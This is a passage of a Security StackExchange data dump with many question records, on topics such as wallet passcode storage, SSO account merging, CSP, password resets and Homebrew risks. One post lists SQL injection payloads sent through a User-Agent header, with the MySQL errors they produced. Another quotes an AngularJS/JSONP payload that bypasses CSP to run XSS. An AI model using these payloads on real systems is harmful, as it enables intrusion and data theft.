<p><strong>2)</strong> Is there any kind of future possibility that I get in trouble if any kind of attack happens or by action of some intruder/admin itself(worst possibility) - the key reveal to the attacker which will lead access and open up all the pub/priv keys from database of that specific User? This way I can not give forget pass-code option to user.</p>

<p><strong>So considering both option Shall I store User's pass-code or not?</strong></p>

<p><strong>What is the best practice to implement this security feature in bitcoin wallet ?</strong></p>

<hr>

<p><strong>Update</strong></p>

<p>This question is not duplicate of <a href=""https://security.stackexchange.com/questions/211/how-to-securely-hash-passwords"">How to securely hash passwords?</a></p>

<p>as the question reveals ways of doing hashing of password and Here What I am asking is to find a best practise to decrypt <strong>pass-code</strong> and it's related impact on the system.</p>

<p><strong>For eg. What If user wants to recover his forget password?</strong></p>
","189297","","189297","","2018-10-22 07:11:49","2018-10-22 08:48:10","Is it safe to store user's secure pass-code in database with encrypted form while creating bitcoin wallet?","<android><account-security><bitcoin><blockchain>","1","3","","","","CC BY-SA 4.0"
"130497","1","","","2016-07-20 00:20:24","","1","1416","<p>I'm trying to test a challenge website using ModSecurity as a WAF. When I put <code>'</code> in the user agent I got an error from MySQL.</p>

<blockquote>
  <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '''')' at line 1</p>
</blockquote>

<p>Now I'm trying to exploit it with this header: </p>

<pre><code>User-Agent: brick') order by 15 --+
</code></pre>

<p>The result is:</p>

<blockquote>
  <p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '')' at line 1</p>
</blockquote>

<p>i found another input that is vulnerable to sql injection too i think maybe it's easier to be exploited ...</p>

<p><code>' order by 15 --+</code> </p>

<p>i tried to inject like this example and it works the result </p>

<p><code>Unknown column '15' in 'order clause'</code> etc..</p>

<p>but when i tried <code>order by 2</code> </p>

<p>i got this result :</p>

<pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'order by 2 --  ', '', '', '', '5', 'Lbs', '', 'Mozilla/5.0')' at line 1
</code></pre>

<p>Any ideas on how to exploit ?</p>
","90690","","90690","","2016-07-20 17:13:41","2016-07-20 17:13:41","Using user agent & inputs for SQL injection with ModSecurity WAF","<web-application><sql-injection><mysql><waf><mod-security>","1","3","","","","CC BY-SA 3.0"
"267812","1","","","2023-01-18 13:56:07","","0","54","<p>Assume my solution offers 5 identity providers that users can choose from</p>
<pre><code>Apple
Facebook
Github
Google
Microsoft
</code></pre>
<p>These providers all take user identity very seriously. Is there any legitimate liability concern that an unauthorized person might be able to authenticate themselves with the same email but with a different identity provider?</p>
<p>The logged in user would have access to their own sensitive personal information and some small funds (worth &lt; $100).</p>
<p>I assume that if that happens, that user's email account must have been compromised, so we can't be liable for that. If one of the auth provider companies was compromised without disclosing it, or allowed people to commit unauthenticated identity fraud, it would be recklessness on their part - and we could help the user recover damages that way.</p>
<p>I'm thinking that the most user friendly approach would be to allow a user to disable &quot;untrusted&quot; auth providers (e.g. a user doesn't trust microsoft, so they can choose to disable microsoft and github sso access), and maybe notify them when their account has been accessed from a new auth provider (although that would go to the compromised email anyways, so is there really a point to that?)</p>
<p>Is there something I'm missing or would that represent sound and reasonable security practice?</p>
<p>related, but doesn't have a concrete answer: <a href=""https://security.stackexchange.com/questions/128821/is-it-safe-to-rely-on-email-address-from-3rd-party-identity-provider"">Is it safe to rely on email address from 3rd party identity provider?</a></p>
","288165","","","","","2023-01-18 14:45:30","Security/Liability Concerns with Sign-In-Provider Account Merging","<authentication><privacy><account-security><sso>","2","0","","","","CC BY-SA 4.0"
"196325","1","","","2018-10-24 20:19:29","","1","258","<p>I have a suspicion that my employer is misusing their work monitoring and remote access software to check my online activity outside of work.</p>

<p>I have the software installed on my personal machine as I occasionally work from home and require remote access to my work PC. I am worried that they are illegally monitoring me, do they have the legal right to do this? </p>

<p>If they were deemed to have been snooping on my records illegally, what would the implications be if proven guilty?</p>

<p>Many thanks in advance.</p>
","189706","","","","","2018-10-27 03:33:31","Can employers log internet traffic of employees personal computers?","<web-browser><account-security><legal><remote-desktop><snooping>","2","2","","2018-10-29 10:14:39","","CC BY-SA 4.0"
"130669","1","","","2016-07-21 21:19:10","","3","232","<p>More and more schools are not teaching cursive handwriting, and many are considering it more of an art, or optional in the curriculum. </p>

<p>I assume this will have an impact on the ability to forge a person's signature. </p>

<p>However, I don't assume that an education (or lack thereof) in cursive affects the difficulty in forging a signature on demand.  That's what this question is about.</p>

<p><strong>Question</strong></p>

<ol>
<li>Does the lack of (or excessive amounts of) handwriting training positively or negatively affect the ability to forge that individuals' signature?</li>
</ol>

<p><strong>Driving need</strong></p>

<p>I am trying to access how much of digital or iPad based signatures are  security theater, or if there is some genuine value here. </p>

<p><a href=""https://i.stack.imgur.com/AXc0Zs.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/AXc0Zs.jpg"" alt=""enter image description here""></a></p>
","396","","","","","2016-07-21 22:39:02","Handwriting/cursive education is on the decline. How does this affect signature-based authentication?","<physical><security-theater><physical-signature>","1","4","","","","CC BY-SA 3.0"
"130693","1","130759","","2016-07-22 08:00:36","","3","2483","<p>There has been a long Debate on CSP modelling, I have a Web application and I use JQuery in it, For that i use JQuery main site <code>http://code.jquery.com/jquery-x.yy.z.min.js</code> to Host it on my Site to work, I know that CDN's can be useful in cases like this, i could also put this in my script tags <code>https://ajax.googleapis.com/ajax/libs/jquery/x.yy.z/jquery.min.js</code> to work-out the Same process. As far as the loading time is concerned Google hosted JQuery is faster than <code>code.jquery.com</code>. </p>

<p>Now, let's say i use the second one i.e ajax.googleapis.com part to Host my JQuery site on my Website. Now, to place Defense-in-depth Mechanism to avoid XSS i use CSP (Content-Security-Policy) headers, Now first thing that i do is to White-List by <code>script-src 'self' ajax.googleapis.com</code> . Now, let's say i have a Portion on my Website where Input is getting reflected without filtering which can cause XSS. Now, inline scripts like <code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code> would get Blocked and Provide me protection. But there is a Negative afterwards, as i have white-listed the ajax.googleapis.com , any attacker can use Angular JS 1.1.3 from the same and cause XSS just like 
<code>""&gt;&lt;script src=""//ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js""&gt;&lt;/script&gt;&lt;div ng-app ng-csp id=p ng-click=$event.view.alert(1337)&gt;&lt;script async src=//ajax.googleapis.com/jsapi?callback=p.click&gt;&lt;/script&gt;</code></p>

<p>This will result in XSS attack, Now the point is How could i Modify my CSP Rule so that it block every other End-point of the Whitelisted site i have Or if It's not Possible than I guess than Google API CDN is surely not a better choice than <code>code.jquery.com</code>. Any Explanation on how to workout? </p>

<p>Because even if i use <code>code.jquery.com</code> and Whitelist it, than Attacker may use older version of Jquery from same CDN and can mis-use it's vulnerability to cause XSS. So what is the Most safest Bet i can put here? Explain</p>
","108946","","","","","2016-07-25 21:22:46","What is more secure practice? Hosting from CDN or Main website","<xss><google><content-security-policy><jquery>","3","6","","","","CC BY-SA 3.0"
"268179","1","268181","","2023-02-03 21:33:51","","1","142","<p>Unfortunately, I've tried a hosting service and it returned my password value as it was in my inbox (as connection details).</p>
<p>I went to a control panel in an attempt to delete or deactivate my account. It showed IP Logged I didn't input any details there, connection was HTTP.</p>
<p>So my questions are:</p>
<ul>
<li>What is the IP log ?</li>
<li>Can I create an additional email account and
use this password again?</li>
<li>Am I doomed?</li>
</ul>
","288898","","47524","","2023-02-03 21:59:05","2023-02-04 18:28:40","Should I worry? Web hosting mailed me my details and returned my password (unencrypted) and IP logged","<passwords><account-security><web-hosting>","2","8","","","","CC BY-SA 4.0"
"196561","1","","","2018-10-28 12:46:50","","2","5958","<p>How does Gmail detect when my mail is accessed from another computer? Does it keep track of my MAC address to check whether a new device is used? I think it doesn't have anything to do with IP address. </p>
","189986","","6253","","2018-10-28 14:17:09","2018-10-28 19:28:12","How does Gmail detect if my email account is accessed from another computer?","<ip><account-security><gmail><mac-address>","2","4","","","","CC BY-SA 4.0"
"268270","1","","","2023-02-07 06:41:47","","0","340","<p><strong>Goal</strong> I'd like to tighten my Content Security Policy.</p>
<p><strong>Situation</strong><br>
I have a single page react application (= All code and styles are bundled together into a <code>bundle.js</code> file). The file is simply placed on a file storage server (Concrete: S3 bucket); No server side rendering. The application uses components which rely on inline styling (<em>Material UI</em>, <em>@emotion/styled</em>). When I set <code>default-src 'self'</code>, the styles stop working. I'd like to use a nonce for all styles to resolve the problem.</p>
<p><strong>The idea</strong><br></p>
<p><em>Client Side Nonce + iframe</em></p>
<p>Instead of loading and running the bundled js file directly on my html page, I would create an iframe inside the html page, which runs the bundled js content. The iframe would get it's own CSP settings, including a nonce. The nonce would be generated from a small part of JS residing inside <code>index.html</code> (but outside the iframe).</p>
<p>So instead of doing this:</p>
<pre><code>&lt;html&gt; 
&lt;script src=&quot;bundle.jp&quot;&gt;
...
&lt;html&gt;
</code></pre>
<p>I would do something like this:</p>
<pre><code>&lt;html&gt; 

//The following content would be generated
&lt;iframe&gt;&lt;script src=&quot;bundle.jp&quot; nonce=&quot;XXXXX&quot;&gt;&lt;/iframe&gt;

&lt;script&gt;
 [generate nonce]
 [generate the iframe above with nonce information]
&lt;/script&gt;
&lt;html&gt;
</code></pre>
<p>Instead of loading and running the bundled js file directly on my html page, I could create an iframe inside the html page, which runs the bundled js content. The iframe would get it's own CSP information, including a nonce. The nonce would be generated from a small part of JS residing outside the iframe (essentially doing what a server would do on server side rendering). The non-iframe part could be delivered with <code>CSP 'self'</code>, as it would not run any styling, but just create the iframe with the nonce.</p>
<pre><code>               Client__________________________________
  CSP:            |index.html                          |
   default-src    |                                    |
  'self'          |     &lt;iframe CSP=&quot;... 'nonce-xxx'&gt;  |
                  |        _____________________       |
                  |       |run bundle.js here   |      |
                  |       |_____________________|      |
                  |     &lt;/iframe&gt;                      |
                  |                                    |
                  |   &lt;script&gt;                         |
                  |      generate iframe above         |
                  |   &lt;/script&gt;                        |
                  |                                    |
                  |____________________________________|

</code></pre>
<p><strong>Question:</strong> Is this a safe approach?</p>
<p>Some related keywords for people in search of the same topic:</p>
<ul>
<li>CSP, Content Security Policy</li>
<li>SPA, Single Page Applications</li>
<li>CSR, Client Side Rendering</li>
</ul>
<p>Note:
This is a duplicate <a href=""https://stackoverflow.com/questions/75363118/use-iframe-to-solve-inline-styling-for-single-page-rest-applications-when-csp-is"">of my question on SO.</a> I manually moved it here as it was suggested.</p>
","288569","","288569","","2023-02-07 11:03:10","2023-02-07 11:03:10","CSP for Single Page App: Use client-side nonce for securing iframe content","<web-application><xss><client-side><content-security-policy><single-page-app>","0","0","","","","CC BY-SA 4.0"
"130896","1","130973","","2016-07-24 21:27:34","","76","11650","<p>Recently, I have discovered a security flaw in a business website. This website has a password-protected ""Partners Area"", and like many websites it provides a form to reset the user's password.</p>

<p>When a user asks for a password reset for his nickname, a new password is sent to their email address and that password becomes immediately effective. The problem is (if this wasn't already a problem) that the new password is a fixed one, for all users. So an attacker can easily get access to any account.</p>

<p>Now, the only operations a user can do within their Partners Area are:</p>

<ul>
<li>View/change email address</li>
<li>Change password</li>
<li>Download some manuals and utilities (it's definitely not classified stuff)</li>
<li>Fill out a repair form (then the process will continue by email)</li>
<li>Download logos and images for marketing purposes</li>
</ul>

<p>The only things I see for a malicious attacker to exploit are:</p>

<ul>
<li>Prevent future access to a legitimate user (which will probably be able to reobtain right after a phone call)</li>
<li>Discover information about who the company customers are (guessing random nicknames and looking at their email address). Anyway, it's not something someone would keep as a secret.</li>
</ul>

<p>Even if I am always very disturbed by things like this, in this case I must admit that it might not be a big deal. Are flaws like this acceptable compromises, in a context where not much harm can be caused?</p>

<hr>

<p><em>Since I think someone misunderstood a detail: that website belongs to an external company. I have no role in the development of that website, and no control over any decision about it.</em></p>
","118432","","118432","","2016-07-25 19:33:37","2016-07-27 17:39:02","Are security flaws acceptable if not much harm can derive from them?","<account-security><web><password-reset>","10","19","","","","CC BY-SA 3.0"
"56091","1","","","2014-04-18 10:39:03","","7","4032","<p><em>This question seems to be related to <a href=""https://stackoverflow.com/questions/15913200/facebook-js-sdk-not-executed-in-my-chrome-extension"">https://stackoverflow.com/questions/15913200/facebook-js-sdk-not-executed-in-my-chrome-extension</a> , but I am not developing a chrome extension. I am developing a normal web application.</em></p>

<p>I am trying to integrate Facebook login on my website, which has a tight CSP policy. I am following the recommendations of <a href=""https://developer.chrome.com/extensions/contentSecurityPolicy"" rel=""nofollow noreferrer"">https://developer.chrome.com/extensions/contentSecurityPolicy</a> , where it is mentioned that 'unsafe-eval' should not be used. However, if I put the following CSP-policy:</p>

<pre><code>    &lt;add name=""Content-Security-Policy"" value=""default-src 'self'; connect-src 'self'; script-src 'self' https://connect.facebook.net; img-src 'self' https://www.facebook.com; media-src 'self'; object-src 'self'; style-src 'self'  'unsafe-inline'; frame-src 'self' https://s-static.ak.facebook.com https://www.facebook.com https://www.youtube.com; ""/&gt;
</code></pre>

<p>then the facebook login does not appear, as the CSP policy restricts unsafe eval code. If I change it to the following:</p>

<pre><code>    &lt;add name=""Content-Security-Policy"" value=""default-src 'self'; connect-src 'self'; script-src 'self' 'unsafe-eval' https://connect.facebook.net; img-src 'self' https://www.facebook.com; media-src 'self'; object-src 'self'; style-src 'self'  'unsafe-inline'; frame-src 'self' https://s-static.ak.facebook.com https://www.facebook.com https://www.youtube.com; ""/&gt;
</code></pre>

<p>then it works. Notice the extra 'unsafe-eval' in the script-src part of the CSP. Anyway, I don't want to use the 'unsafe-eval' condition, as this would greatly reduce the security of my website.</p>

<p><strong><em>Is there a way that I can use the Facebook login (SDK), without having to use 'unsafe-eval' in my CSP policy?</em></strong></p>
","38069","","-1","","2017-05-23 12:40:33","2016-09-09 18:42:33","Content-Security-Policy & Facebook login","<web-browser><xss><facebook><content-security-policy>","1","5","","","","CC BY-SA 3.0"
"196747","1","196762","","2018-10-31 04:37:12","","1","84","<p>My project is implementing The CIS Critical Security Controls, Version 6.1
Can anyone please give me some advice on how we can address sub-control 16.10 which says.....</p>

<p>""<em>Profile each user’s typical account usage by determining normal time-of-day access and access duration. Reports should be generated that indicate users who have logged in during unusual hours or have exceeded their normal login duration. This includes flagging the use of the user’s credentials from a computer other than computers on which the user generally works.</em>""</p>

<p>Is there any way to add such user access constraints as day names, date range, time of day and access duration to a Windows O/S and report when attempts are made to use the user account outside these constraints?</p>
","188164","","","","","2018-10-31 12:09:52","Center for Internet Security Version 6.1 Critical Security Control 16-10","<windows><access-control><account-security><authorization><user-management>","1","0","","","","CC BY-SA 4.0"
"131149","1","","","2016-07-27 12:27:54","","6","2219","<p>I'm wondering what this new technique will <em>not</em> protect us against.</p>

<p>As I see it, since inline scripts are disabled (and I assume that includes <code>javascript:</code> links) then it solves the issue of covert theft of sensitive data via auto-executed JavaScript.</p>

<p>However, it would still be possible to alter the data on the screen in unexpected ways, and possible to create a convincing Phishing scam by providing a link out to another website.</p>

<p>Is this accurate, or are out-links prohibitable also?</p>

<p>There may be tricky ways to capture sensitive data in an external resource call as well, as I am not familiar with the scope of CSP.</p>

<p>What is the scope of a would-be XSS attack with the presence of a tight CSP?</p>

<p>Edit: updated assumptions for  the purpose of this post:</p>

<ul>
<li>Users have a CSP 2 capable browser.</li>
<li>Inline <code>style=</code> is still going to be allowed by the policy. <code>style-src ... unsafe-inline</code></li>
<li>We will only allow resources to be loaded from domains we control. (no external images)</li>
<li>We run our own CDN, so that domain has no 3rd-party content, and fits the same security standards as the main domain.</li>
</ul>
","764","","764","","2016-07-28 16:40:38","2016-07-28 16:40:38","What are the limitations of Content Security Policy?","<xss><content-security-policy>","3","1","","","","CC BY-SA 3.0"
"196918","1","","","2018-11-02 19:56:47","","1","130","<p>I'm working in a new clients system, and they automatically assign permissions based on the domain name for the email address the account was created under (they do require validation via an email).</p>

<p>They check that the email ends with <code>@somedomain.tld</code>. For large banking corporations. If you have the appropriate domain name you will have full access to employment histories, address histories, SSNs....etc for a cuople million people. These are 3rd party domains (that are used for the email addresses), are under no control of the aforementioned client operating this system. And are the company email addresses of whomever owns those domains. There are ~500 domains whose email addresses have access in this manner.</p>

<p>Are there security pitfalls with this? Are there exploits that have been used to work around such systems?</p>

<p>My goal is to do some due diligence since at first glance this seems like a fragile way of authorizing access to such information. But I do not have the knowledge to say if it is or is not. I would also like to know, outside of the scope of the above scenario, if there are pitfalls and issues with this sort of setup, regardless of the type of role or risk.</p>
","79540","","79540","","2018-11-03 00:50:45","2018-11-03 07:26:54","Are there security pitfalls on relying on an emails domain to automatically assign permissions?","<email><appsec><account-security>","2","5","","","","CC BY-SA 4.0"
"268581","1","","","2023-02-20 15:30:42","","0","46","<p>I am working with a SaaS app. Often times, customers write into the help desk, live chat, or phone to ask for data exports from their account (normal request). While we do some validation on the user, all of it seems error-prone. For live chats, users are automatically verified via an encrypted client-side key in the Javascript. For emails, we check the email address they're sending from and email directly to ask for secondary permission. For phone calls, we ask for a few items of account details to verify them.</p>
<p>I want to improve this. I noticed some companies are using randomly generated support PINs that are only accessible after the user is logged in (<a href=""https://support.google.com/cloudidentity/answer/7668654?hl=en"" rel=""nofollow noreferrer"">Google is one example</a>). They're temporary PINs and can be validated by support agents against, perhaps the user's email.</p>
<p>Do we think that is a better approach?</p>
","289587","","","","","2023-02-20 15:30:42","Customer support PIN a good idea?","<account-security><social-engineering>","0","0","","","","CC BY-SA 4.0"
"196935","1","196937","","2018-11-03 08:58:55","","1","94","<p>I use MAC OS operation system that I frequently connect to my iPhone, I use Gmail, my university e-mail service, my university personal space, and numerous other websites that require log-in. </p>

<p>I know that I've been hacked, someone has full control over my computer, not in GUI way, but that person can delete files and create files. If he/she access to anything else I really can't say. </p>

<p>My solution is to change my computer, buy a new one and I won't try to do any information exchange happen between my new computer and the old one. But I still need to use my university account, e-mails, Gmail and my account on the websites, and I still need to use my iPhone. </p>

<p>Is this enough to guarantee the cybersecurity against that specific person ? or I need to change my phone, emails, and everything? </p>

<p>Here is a screenshot that i've received from the hacker.
<a href=""https://i.stack.imgur.com/921HV.jpg"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/921HV.jpg"" alt=""enter image description here""></a></p>
","190411","","190411","","2018-11-03 09:44:36","2018-11-03 09:52:58","Find the way back to the safe mode","<account-security>","1","8","","","","CC BY-SA 4.0"
"268666","1","","","2023-02-24 10:39:39","","1","39","<p>I assume most of the security issues with old software are</p>
<ul>
<li>that scripts or .exe will run against the bugs in the software.</li>
<li>and that the firmware on the device OS bugs aren't patched.</li>
<li>Or some parts of the machine are accessible to the internet so can be remotely hacked?</li>
<li>Or when opening downloaded files from trusted or untrusted sources you get malware from them that targets the bugs/unpatched areas?</li>
</ul>
<h3>Assuming one patches:</h3>
<ul>
<li>OS</li>
<li>Firewall</li>
<li>Internet-facing parts</li>
<li>Hopefully Firmware (hard for old hardware?)</li>
</ul>
<p><strong>Where can you look for best practices on what to do next when using legacy software?</strong></p>
<p>I ask as many businesses have legacy software and hardware and struggle to switch on cost, useability.</p>
<p>This is not meant to be a &quot;write a book&quot; answer as I have asked for other good sites where this might be answered in some detail instead?</p>
<p>I realise this will change over time hence why other sources that update will be better?</p>
","108299","","187989","","2023-02-24 14:11:28","2023-02-24 14:11:28","Where to find updated best practice on using unmaintained or legacy software on a patched OS?","<account-security><operating-systems><software>","0","7","","","","CC BY-SA 4.0"
"131310","1","","","2016-07-28 21:46:01","","1","150","<p>I have taken a big interest in securing my digital info and feel like I have addressed many typical problems.  For example:</p>

<ul>
<li>I've gone to full disk encryption on my android phone and linux laptop.</li>
<li>My phone requires a pattern to boot or unlock, and can be locked or wiped remotely.</li>
<li>I've started using a password manager with strong unique passwords for as many accounts as I can remember having.</li>
<li>I've studied password generating and cracking and developed some strong passwords to lock down the services I have to type manually and the password manager; and setup reminders to change them periodically.</li>
<li>I've enabled 2-factor authentication for as many websites as have it, for example Google and Amazon</li>
<li>I've made sure all my devices are up to date and setup to stay that way.</li>
</ul>

<p>What are some similar, simple steps to take to protect one's identity?</p>

<p>To keep the scope of this question smaller, I'm looking for a list of technical or behavioral solutions that address common identity theft attacks; I'm not looking for answers broad enough to address phishing, social engineering attacks, physical damage/theft etc. or that are extremely onerous or that protect against extremely unlikely attacks.  I'm also not worried about data collection from companies I've chosen to have a relationship with like Google, Amazon, etc; but answers about protection from personally identifiable information collected passively via device fingerprints or the like would be on topic.</p>

<p>I'm basically looking for the short list of dumb things not to do that unwittingly make myself vulnerable to financial or reputation damage (but mostly financial).  For example, not choosing a password in the format of capitalized word + 2 digit number length &lt;= 8.</p>

<p>I know this question is similar to the closed question <a href=""https://security.stackexchange.com/questions/111691/what-else-can-i-do-to-protect-my-accounts"">here</a> but I've tried to confine my question to a very specific scope. </p>
","54170","","-1","","2017-03-17 13:14:43","2016-07-29 14:37:36","What are simple things I can do to protect my digital identity?","<privacy><account-security>","0","7","","2016-07-31 18:57:00","","CC BY-SA 3.0"
"197082","1","","","2018-11-06 00:01:18","","5","862","<p>We are trying to find the best way to allow JavaScript in a web application while being safe against XSS. </p>

<p>Site admins have the privilege to insert JavaScript to control the site templates, and publish this to site users. However, site users cannot insert JavaScript.</p>

<p>I know allowing JavaScript will open up a XSS vulnerability, letting site admins steal sensitive info from site users. Is there a better way to allow JavaScripts for site admins?</p>
","190596","","98538","","2018-11-06 00:49:40","2019-03-03 08:18:02","How to safely allow scripts but preventing XSS?","<web-application><xss><javascript><appsec><content-security-policy>","3","1","","","","CC BY-SA 4.0"
"197095","1","197114","","2018-11-06 06:44:44","","9","3147","<p>I read (<a href=""https://applehelpwriter.com/2018/03/21/how-homebrew-invites-users-to-get-pwned/"" rel=""noreferrer"">here</a> and <a href=""https://hackerone.com/homebrew/"" rel=""noreferrer"">here</a>) that Homebrew (the Unix package manager) is a significant Mac security risk.  An attack is allowed because Homebrew makes <code>/usr/local/bin</code> writable without root user privilege, which allows another Homebrew process to write a malicious process into this directory tree.  The <code>/usr/local/bin</code> tree is by default prefixed before <code>/usr/bin</code> in the path for the shell.  As such, an attacker could inject a malicious binary to change the clock or steal an administrator's password (malicious sudo for instance).</p>

<p>Is there anyone out there aware of these vulnerabilities?  Does anyone have a better method of gaining access to critical Unix commands without impacting the security of the end user's terminal (MacBook w/ OSX for instance)?  Do you use Macports which relies on a package manager that installs using root privilege to /opt?  Do you perform all your Unix shell work in an emulator like Virtual Box or VMWare?</p>

<p>I know there are many security holes starting with manufacturing and as soon a software app is installed.  I'm very curious on best practices from a security expert on this.</p>

<h1><strong>UPDATE 2018-11-07</strong></h1>

<p>I checked with the macports mailing list and received quick detailed replies.  Unfortunately, no response with details on functionality from the Homebrew forum.  At this point, I suspect macports has better security functionality.  There can always be a hole somewhere and to be truly secure, I will consider installing these open source applications in a self contained emulated container.  For instance using VirtualBox, VMWare or Parallels.  This way, if there is a security issue, it will be contained and not expose access to the Mac Keychain or other critical data.</p>

<h1><strong>UPDATE received from macports mailing list</strong></h1>

<p>Installing MacPorts using the installer package posted on our web page requires an administrator password, and the files and directories it installs are owned by root, meaning nobody but an administrator can change them. It also creates a normal unprivileged user account called ""macports"" for MacPorts to use later.</p>

<p>Using MacPorts as installed in this way also requires an administrator password. The files MacPorts ports install are usually owned by root, though individual ports can make their own decisions about that. For example, a database server port might create a special user account to be used by the database server when it's running, and it might install an empty directory where the files that the database server will write can live, and the owner of that directory would be set to that new user account.</p>

<p>When you invoke the ""port"" command with ""sudo"" and provide your administrator password, MacPorts switches to the unprivileged ""macports"" user. At that point it no longer has root privileges so even if a malicious portfile were committed that tried to do this, it could not modify files outside of its build directory. MacPorts elevates back to root privileges when doing something that requires root access, for example for the final step that actually installs the files into the /opt/local prefix.</p>

<p>It is possible to build MacPorts from source configured not to use root access, and if you do that, you don't get the above protections. We don't recommend doing this.</p>

<p>MacPorts keeps track of what files each port installs and does not permit one port to overwrite another port's files (unless the user requests this by using the -f flag, so the user should refrain from habitually using this flag).</p>

<h1><strong>Another post</strong></h1>

<p>It is also to be noted that homebrew can not suddenly change itself to deliver this degree of security without a fairly complete rehash of the way it works, and most/many/all of it's ""advantages"" of installing in /usr/local that have served to make it popular would then be totally lost, and most likely many/most/all of it's formulae would need to be rewritten to accommodate this change. Many of them at present assume things are found automatically in /usr/local .</p>

<p>homebrew has been popular because it's ""easy"" -- it's files in /usr/local are found without intervention by any compiler or shell. However,  that does not come without costs. </p>

<p>MacPorts requires more work to specifically include certain include paths, library paths, and executable paths -- but that comes with some knowledge of what you're actually getting, and the security of knowing that it can't be messed with without your permission.</p>
","187220","","187220","","2018-11-07 21:28:41","2018-11-07 21:28:41","How Homebrew may impact your Mac's security","<macos><account-security><unix><package-manager><apple>","1","1","","2018-11-06 16:31:30","","CC BY-SA 4.0"
"56508","1","","","2014-04-24 08:00:05","","3","1227","<p>In this article about <a href=""http://www.howtogeek.com/121267/11-ways-to-make-your-lastpass-account-even-more-secure/"" rel=""nofollow noreferrer"">increasing the security of LastPass</a> the author suggests:</p>
<blockquote>
<p>For additional security, you can have LastPass send security-related
emails to a special security email address instead of your normal
email address. For example, password hint emails, account recovery
emails, and multi-factor authentication disable emails will all be sent
here.</p>
<p>This email should be an extra-secure email address only you know about
– if someone gains access to your day-to-day email account, they won’t
be able to access your LastPass vault without access to your security
email account.</p>
</blockquote>
<p>Is this good advice or is it just an unnecessary complication having another e-mail address? Is the idea that an e-mail address not frequently used would appear in fewer databases and is therefore less likely to be (randomly) hacked?</p>
<p>This article focuses on LastPass, but would such an e-mail account be good for other things such as receiving password resets for other e-mail accounts?</p>
","10714","","-1","","2020-06-16 09:49:05","2014-05-25 14:10:32","Does having a separate e-mail account only for security, increase security?","<email><security-theater>","2","2","","","","CC BY-SA 3.0"
"268741","1","","","2023-02-27 14:11:06","","0","70","<p>I'm designing an app that receives sensitive data input from a user and that data needs to be saved securely in a database.
As far as I understand it needs asymmetric encryption but since this app has a login to authenticate. I need this previously saved data to be read again by the user without serious security problems and I need the keys not to be saved locally. I don't know how to do it because it's my first project that requires these specifications. I was thinking of creating a strong authentication, perhaps using an otp.</p>
","289876","","","","","2023-02-27 14:11:06","store strings in db with asymmetric encryption for a python app keeping the data secure","<encryption><authentication><account-security><mysql><python>","0","4","","","","CC BY-SA 4.0"
"197225","1","209445","","2018-11-08 09:49:21","","3","1889","<p>Designing a new flow for a ""forgot your password"" feature we are developing, i came across a challenging question regarding the URL and the commitment that has to be made between frontend and backend developers.</p>

<p>Although that's not the point of the question, i appose the flow for a better understanding of the reader.</p>

<ul>
<li>Request reset for an email (frontend)</li>
<li>Whether the given email is present or not send response OK (backend)</li>
<li>Generate a random reset-hash (if one is not present &amp; not expired, to avoid spam) (backend)</li>
<li>Send the reset link @ user's email (backend)</li>
<li>Redirect to a URL with the password reset form (frontend)</li>
</ul>

<p>And there is the point that the question kicks in.</p>

<p>What information needs to be send (with the URL) to the frontend, so that the frontend knows what user identifier needs to be sent back?</p>

<p>My first thought is that frontend needs to send back the new user's password alongside the hash from the email, so that server gets the user's info from matching hash with reset-request. Even if somebody bruteforces the hashes, and finds out a password-reset page he will never know for which user he is changing the password for.</p>

<p>Am i missing something here or this is the most secure way to handle the reset-URL, given that 2-factor authentication functionality is not present? </p>

<p>Is this how large corps handle the reset-link functionality? </p>

<p>Thanks in advance!</p>
","182089","","","","","2020-07-09 08:13:29","Password Reset URL strategy","<web-application><password-management><account-security><password-reset>","1","2","","","","CC BY-SA 4.0"
"131594","1","","","2016-08-01 13:24:01","","-2","186","<p>Why do we need keys ... Let's make an app that works on an ad-hoc network and can control our basic functions replacing our key....  And bdw how does key helps in getting car started</p>
","119170","","","","","2016-08-06 05:32:23","Why cant we get rid of car keys and introduce an app to control our car","<security-seal>","3","7","","2016-08-01 22:02:16","","CC BY-SA 3.0"
"197464","1","197467","","2018-11-11 15:34:28","","0","283","<p>As it is well known, the extended support of Windows 7 (Service Pack 1) ends on January 14, 2020. Due to the short time that remains, I raise this question.</p>

<p>What consequences could an outdated operating system without continued updates have?</p>

<p>Taking into account that:</p>

<ul>
<li><p>Updated antivirus.</p></li>
<li><p>Firewall installed, updated and configured the rules for applications that are allowed to connect to the internet. In addition to this and as additional protection, having the file control of the firewall active (it warns against a change in key registry keys, connection to the network, use of the keyboard, etc).</p></li>
<li><p>Standard account for daily use. The administrator account, only to make installations and important modifications in the system.</p></li>
<li><p>Updated applications.</p></li>
</ul>

<p>Even if I do not have the system updated and having all of this configured, what problems could it bring me?</p>
","190421","","189423","","2018-11-12 02:16:43","2018-11-12 02:16:43","What consequences could there be to the continued use of an operating system without updating?","<windows><vulnerability><account-security><updates>","2","1","","","","CC BY-SA 4.0"
"56807","1","","","2014-04-28 11:33:01","","1","99","<p>I am trying to come up with a solution for a system where i need to <strong>generate a key (Kn)</strong> from time to time and distribute it to a large number of servers in a private network. 
Since it has to be a <strong>scalable solution</strong>, i thought about using a <strong>KDC along with multicast</strong> to communicate with all servers in order to update Kn, but although it is a private network i am concern about security.
Even if i have a <strong>private key (K)</strong> known only to the KDC and all trusted servers, used to <strong>encrypt Kn like M = E(Kn,K)</strong> (and decrypt to recover Kn), how should K be distributed to all trusted servers?</p>

<p><strong>Edit:</strong>
What i am trying to do is, every time the KDC generates a new Kn, it will it send over multicast for all trusted servers in the multicast group. That means the servers will be passively listening for any key changes.
Timing in this solution is not important.</p>

<p>If someone could point me in the right direction, i would appreciate it!
Thank you.</p>
","44652","","44652","","2014-04-28 13:03:51","2014-04-28 13:03:51","Key Distribution using multicast","<network><key-management><security-theater>","0","1","","","","CC BY-SA 3.0"
"131728","1","","","2016-08-02 18:29:03","","2","434","<p>I have created a password security system. 
I wanted to get your reviews about it and its technical problems.</p>

<p>In this system, users create a dynamic password that will change every time they try to log in based on their unique formula they wrote when registered.</p>

<p>Example of password created: <code>apple{{A+2}}{{B+C}}{{D*E}}green</code></p>

